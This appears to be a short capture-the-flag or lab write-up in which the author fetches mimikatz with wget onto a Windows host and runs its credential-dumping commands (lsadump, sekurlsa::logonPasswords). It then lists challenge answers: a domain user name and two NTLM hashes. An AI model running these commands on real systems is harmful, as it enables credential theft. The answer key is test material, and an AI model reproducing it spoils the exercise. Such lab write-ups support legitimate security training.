# Dump It Like It's Hot and Not the soft and fluffy kind

From here it was smooth sailing to `wget` the mimikatz and run it as the admin-petersj:  
![mk1](dlih-wget-mk.png)
Then run it:  
![mk2](dlih-mk-init.png)

I used these commands as instructed:  
```mimikatz
privilege::debug
token::elevate
lsadump::lsa /patch
lsadump::sam
sekurlsa::logonPasswords
```

Follow the links to the output for each:
[DLIHlsaSAMdump](Dump-it-like-its-hot-to-not-the-soft-and-fluffy-kind/DumpDLIHlsaSAMdump)  
[DLIHsekulsa](Dump-it-like-its-hot-to-not-the-soft-and-fluffy-kind/DLIHsekulsa)  
[DLIHsekulsaLogonPasswds](Dump-it-like-its-hot-to-not-the-soft-and-fluffy-kind/DLIHsekulsaLogonPasswds)  



## Answers

What domain user was logged in?
```{toggle}
BlaireJ
```
What is the user's hash?
```{toggle}
c374ecb7c2ccac1df3a82bce4f80bb5b
```
What is the administrator's NTLM hash?
```{toggle}
a06e58d15a2585235d18598788b8147a
```